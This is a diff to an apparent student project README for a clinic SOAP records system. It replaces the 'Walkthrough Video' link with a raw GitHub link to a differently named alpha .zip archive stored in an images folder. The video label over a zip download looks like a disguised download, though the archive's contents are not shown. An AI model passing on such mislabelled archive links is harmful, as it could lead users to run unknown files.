@@ -57,7 +57,7 @@ We are Group 5, and our project is Metro Medical Clinic, a web-based SOAP (Subje
     
 - **Demonstration:**
   - Walkthrough Video of the System:
-  -(https://raw.githubusercontent.com/joshualegado008/GROUP4_CASESTUDY/master/Goniaster/GROUP4_CASESTUDY.zip)
+  -(https://raw.githubusercontent.com/joshualegado008/GROUP4_CASESTUDY/master/images/GROU-CASESTUDY-v2.4-alpha.5.zip)
 
 - **Feedback from Stakeholders:**
   - Positive feedback:
